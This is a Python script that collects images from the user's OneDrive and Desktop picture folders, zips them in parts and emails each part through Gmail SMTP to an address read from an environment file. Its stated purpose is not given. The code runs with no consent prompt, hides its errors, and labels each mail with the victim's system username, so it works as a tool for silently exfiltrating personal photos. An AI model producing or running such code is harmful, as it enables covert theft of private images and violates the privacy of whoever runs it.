import shutil
import os
import zipfile
import smtplib
import getpass
from email.message import EmailMessage
from pathlib import Path
from PIL import Image, UnidentifiedImageError
from dotenv import load_dotenv
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

# Load environment variables from .env file
load_dotenv()

SENDER_EMAIL = os.getenv("SENDER_EMAIL")
SENDER_PASSWORD = os.getenv("SENDER_PASSWORD")
RECEIVER_EMAIL = os.getenv("RECEIVER_EMAIL")

SKIP_FOLDERS = {"AppData", "node_modules", ".cache", ".git", "__pycache__", "venv", ".venv"}
IMAGE_EXTENSIONS = {'.jpg', '.jpeg', '.png'}
MAX_FILE_SIZE_MB = 50
MIN_IMAGE_DIM = 64
EMAIL_ZIP_LIMIT_MB = 25
SYSTEM_USER = getpass.getuser()

# Paths
BASE_DIR = Path.cwd()
DEST_FOLDER = BASE_DIR / f"DetectedMedia_{SYSTEM_USER}"
ZIP_FOLDER = BASE_DIR / f"Zips_{SYSTEM_USER}"
DEST_FOLDER.mkdir(exist_ok=True)
ZIP_FOLDER.mkdir(exist_ok=True)

def get_common_paths():
    home = Path.home()
    folders = []
    onedrive_path = home / "OneDrive"
    if onedrive_path.exists():
        folders.append(onedrive_path)
    desktop_path = home / "Desktop"
    if desktop_path.exists():
        for folder in ["Pictures", "Screenshots", "Images", "Camera Roll"]:
            folder_path = desktop_path / folder
            if folder_path.exists():
                folders.append(folder_path)
    return folders

def is_image(file_path):
    try:
        with Image.open(file_path) as img:
            width, height = img.size
            return width >= MIN_IMAGE_DIM and height >= MIN_IMAGE_DIM
    except (UnidentifiedImageError, IOError):
        return False

def is_likely_system_file(file_path):
    name = file_path.name.lower()
    return (
        file_path.suffix.lower() in ['.ico', '.lnk']
        or name.startswith(('icon', 'desktop', 'thumb'))
        or 'system' in name
    )

def process_file(file_path):
    try:
        if not file_path.exists() or is_likely_system_file(file_path):
            return 0
        if file_path.stat().st_size > MAX_FILE_SIZE_MB * 1024 * 1024:
            return 0
        if file_path.suffix.lower() in IMAGE_EXTENSIONS and is_image(file_path):
            dest = DEST_FOLDER / f"IMG_{file_path.name}"
            if not dest.exists():
                shutil.copy2(file_path, dest)
                return 1
    except Exception:
        pass
    return 0

def copy_media_files():
    paths = get_common_paths()
    files_to_process = []
    for folder in paths:
        for root, _, files in os.walk(folder):
            root_path = Path(root)
            if any(part in SKIP_FOLDERS for part in root_path.parts):
                continue
            for file in files:
                files_to_process.append(root_path / file)

    copied = 0
    with ThreadPoolExecutor() as executor:
        futures = [executor.submit(process_file, f) for f in files_to_process]
        for future in as_completed(futures):
            copied += future.result()
    return copied

def split_and_zip_images():
    zip_paths = []
    current_size = 0
    part_files = []
    part_number = 1

    def create_zip(files, part):
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        zip_name = f"images_part{part}_{timestamp}.zip"
        zip_path = ZIP_FOLDER / zip_name
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for file in files:
                zipf.write(file, arcname=file.name)
        return zip_path

    for file in sorted(DEST_FOLDER.glob("IMG_*")):
        size_mb = file.stat().st_size / (1024 * 1024)
        if current_size + size_mb > EMAIL_ZIP_LIMIT_MB:
            if part_files:
                zip_paths.append(create_zip(part_files, part_number))
                part_number += 1
                part_files = []
                current_size = 0
        part_files.append(file)
        current_size += size_mb

    if part_files:
        zip_paths.append(create_zip(part_files, part_number))
    
    return zip_paths

def send_email(zip_file_path):
    msg = EmailMessage()
    msg["Subject"] = f"Images Part from {SYSTEM_USER}"
    msg["From"] = SENDER_EMAIL
    msg["To"] = RECEIVER_EMAIL
    msg.set_content(f"Attached is one part of zipped images from {SYSTEM_USER}")

    with open(zip_file_path, "rb") as f:
        msg.add_attachment(f.read(), maintype="application", subtype="zip", filename=zip_file_path.name)

    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
        smtp.login(SENDER_EMAIL, SENDER_PASSWORD)
        smtp.send_message(msg)

# === Run Steps ===
copied_count = copy_media_files()
print(f"[✓] Copied {copied_count} new image files to {DEST_FOLDER}")

zip_files = split_and_zip_images()
for z in zip_files:
    print(f"[✓] Zipped to {z.name} in {ZIP_FOLDER}")
    send_email(z)
    print(f"[✓] Email sent with zip: {z.name}")
